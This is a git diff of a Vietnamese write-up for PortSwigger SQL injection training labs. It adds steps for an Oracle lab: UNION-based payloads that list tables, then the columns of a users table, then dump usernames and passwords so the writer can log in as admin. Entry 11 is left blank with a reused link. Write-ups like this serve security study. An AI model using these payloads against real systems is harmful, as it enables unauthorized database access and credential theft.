@@ -65,11 +65,20 @@ author: ['default']
 ![image](https://user-images.githubusercontent.com/61643034/209443750-96e84f6a-b582-40ce-8796-4383a022bdf8.png)
 
 - Vào ***My Account*** rồi login với tài khoản admin trên là xong =)))
-- 
-**[10.]()**
 
-**[11.]()**
- 
+**[10.SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)**
+
+- Dùng payload ```'+UNION+SELECT+'abc','def'+FROM+dual--``` -> hiện ra list bảng thấy có bảng user đặc biệt
+![image](https://user-images.githubusercontent.com/61643034/209445285-0d03af36-06d8-4c80-be92-c6ebd47be4e1.png)
+- Giờ có user -> đổi payload thành ```'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_VODNEC'--``` (vì mình để lab lâu nên nó tự đổi tên user_name :> )
+![image](https://user-images.githubusercontent.com/61643034/209446011-b155badb-1b25-4d34-bb21-c5c50d1d4875.png)
+- Tiếp có username và password -> đổi payload thành như sau ```'+UNION+SELECT+USERNAME_VGBMEN,PASSWORD_BDEQAY+FROM+USERS_VODNEC--```
+![image](https://user-images.githubusercontent.com/61643034/209446101-873b06f6-415e-42e4-b36d-0345d5af381e.png)
+- Bây giờ chỉ login vào nữa :> 
+
+**[11.](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)**
+- 
+
 **[16.SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 ![image](https://user-images.githubusercontent.com/61643034/209040423-3270052e-3a07-4225-9431-70a5c5d6b9cc.png)**
 
